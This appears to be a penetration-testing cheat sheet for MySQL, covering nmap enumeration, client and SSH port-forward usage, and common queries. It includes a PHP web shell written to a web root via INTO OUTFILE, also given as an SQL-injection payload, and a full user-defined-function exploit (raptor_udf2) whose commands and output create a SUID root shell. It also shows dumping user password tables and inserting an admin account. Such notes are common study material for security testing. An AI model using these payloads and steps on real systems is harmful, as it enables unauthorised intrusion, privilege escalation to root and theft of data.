# MySQL

MySQL usually runs on port `3306`.

Nmap targeted scan:

```bash
nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse -p 3306 10.10.10.10
```

Check if MySQL port is open locally:

```bash
# Linux
netstat -tulpn
ss -lntu
lsof -i
```

## MySQL Client

Interact with local MySQL:

```bash
# Interactive login to database (asks for password)
mysql -u root -p

# Supply password via parameter (no space after -p is on purpose)
mysql -u root -pPassWord
mysql -u admin_user -p's0m3p4ss!§$'

# Execute query as one-liner (non-interactive)
mysql -u admin_user -p's0m3p4ss!§$' -e 'SHOW DATABASES;'
mysql -u admin_user -p's0m3p4ss!§$' -e 'USE mydatabase; SHOW TABLES;'
mysql -u admin_user -p's0m3p4ss!§$' -e 'USE mydatabase; SELECT * FROM users;'

# Use specific database
mysql -u admin_user -p's0m3p4ss!§$' -D mydatabase
mysql -u admin_user -p's0m3p4ss!§$' -D mydatabase -e 'SHOW TABLES;'
```


Interact with remote MySQL:

```bash
mysql --host 10.10.10.10 --port 3306 -u root -p
mysql -h 10.10.10.10 -P 3306 -u root -p
```

## Port Forward MySQL Port

Forward remote MySQL port to your local machine with SSH.

Let's assume you have SSH access to a remote host that runs MySQL, but that server is only accessible from localhost.

Example SSH credentials:

* user: myuser
* pass: iloveyou

```bash
# Local port forward example:
ssh -N -L 1337:127.0.0.1:3306 myuser@targethost
## Type SSH password: iloveyou
## Shell will "freeze"

# In another shell confirm local port 1337 is open
netstat -tulpn
##  127.0.0.1:1337  LISTEN

# Log into forwarded mysql server:
mysql -u root -p -h 127.0.0.1 -P 1337
```

For more info on port forwarding see [SSH Cheatsheet - Port Forwarding](./ssh.md#port-forwarding).

## Common Queries

Enumerate Database Engine and version:

```bash
# Common MySQL
SELECT VERSION();
SELECT version();
SELECT @@version;

# Oracle
SELECT banner from v$version;
```

Basic Navigation:

```bash
# show all accessible databases
SHOW DATABASES;

# switch to a particular database
USE website_db;

# list tables in current database
SHOW TABLES;
```

Dump table content:
```bash
SELECT * from users;
SELECT username, password from users;
```

Enumerate column names for a particular table:

```bash
# Common MySQL
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME COLUMN_NAME DATA_TYPE WHERE table_name = 'Users'

# Oracle
SELECT * FROM all_tab_columns
SELECT COLUMN_NAME,DATA_TYPE,TABLE_NAME FROM all_tab_columns WHERE TABLE_NAME='users'
```

Alternative way to enumerate table names:

```bash
# Common MySQL
SELECT * FROM information_schema.tables
SELECT TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE FROM information_schema.tables

# Oracle
SELECT * FROM all_tables
SELECT TABLE_NAME,TABLESPACE_NAME,OWNER FROM all_tables
```

Insert into table:

```bash
# Syntax
INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, value3, ...); 

# Example
INSERT INTO users (username, password) VALUES ("new_admin", "5F4DCC3B5AA765D61D8327DEB882CF99"); 
```

Create file:

```bash
# basic syntax
SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'

# sqli
' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
```

## MySQL Common Exploit - User-Defined Function (UDF)

* MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
* Exploit: https://www.exploit-db.com/exploits/1518

This should also work with version 5+

Requirements:

* The mysqld process runs as root
* We can connect to MySQL as root user. Either because we do not have to supply a password. Or because we know the mysql root user password from enumeration.


Compile the exploit (preferably on target machine).

Regular x86:
```bash
gcc -g -c raptor_udf2.c
```

For x64:
```bash
gcc -g -c raptor_udf2.c -fPIC
```


Create a shared object from the exploit binary:
```bash
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

On the target, create the plugin/function and use it to make suid copy of bash:

```bash
$ mysql -u root -p
Enter password:
[...]
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/tmp/exploit/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql> select do_system('cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell');

```

To gain a root shell just execute the copied bash binary:

```bash
$ /tmp/rootshell -p
rootshell-4.1# whoami
root
```

-p flag to keep the SUID, bash would otherwise automatically drop it.


### Troubeshooting

If the file copied to the plugin directory has byte size 0, then mysql could not read your .so file. Pick a different source directory.

Depending on the version of MySQL you will have to change plugin directory. Here in version 5 it is `/usr/lib/mysql/plugin/`.

In the original exploit description they just write to `/usr/lib/` (presumably for version 4). Do some googling.

You might be able to figure out the plugin directory with:

```bash
mysql> show variables like 'plugin_dir';
```

### MariaDB

This alsow works for affected MariaDB versions, but the plugin directory is different:

```bash
/usr/lib/x86_64-linux-gnu/mariadb18/plugin/raptor_udf2.so
/usr/lib/x86_64-linux-gnu/mariadb19/plugin/raptor_udf2.so
```

Might require some research on your end.

